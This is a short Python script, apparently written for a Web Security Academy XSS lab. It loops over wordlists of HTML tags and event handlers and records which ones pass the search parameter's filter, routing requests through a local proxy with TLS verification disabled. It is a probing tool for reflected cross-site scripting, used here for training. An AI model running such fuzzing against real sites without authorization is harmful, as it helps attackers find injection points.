import requests,urllib3

proxies = {
    "http" : "127.0.0.1:8080",
    "https" : "127.0.0.1:8080"
}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0a8800ba04ed1ad081499db5005c002c.h1-web-security-academy.net/?search=<{tag} {event}>"

with open("tags.txt","r") as file:
    tags = file.read().splitlines()

with open("events.txt","r") as file:
    events = file.read().splitlines()

for i in range(len(tags)):
    response = requests.get(url=url.format(tag=tags[i],event=""),proxies=proxies,verify=False)
    if response.status_code == 200 :
        print(f"allowed tag = {tags[i]}:")
        for j in range(len(events)):
                response = requests.get(url=url.format(tag=tags[i],event=events[j]),proxies=proxies,verify=False)
                if response.status_code == 200 :
                    print(f"\tallowed event={events[j]}")
    else:
        pass
            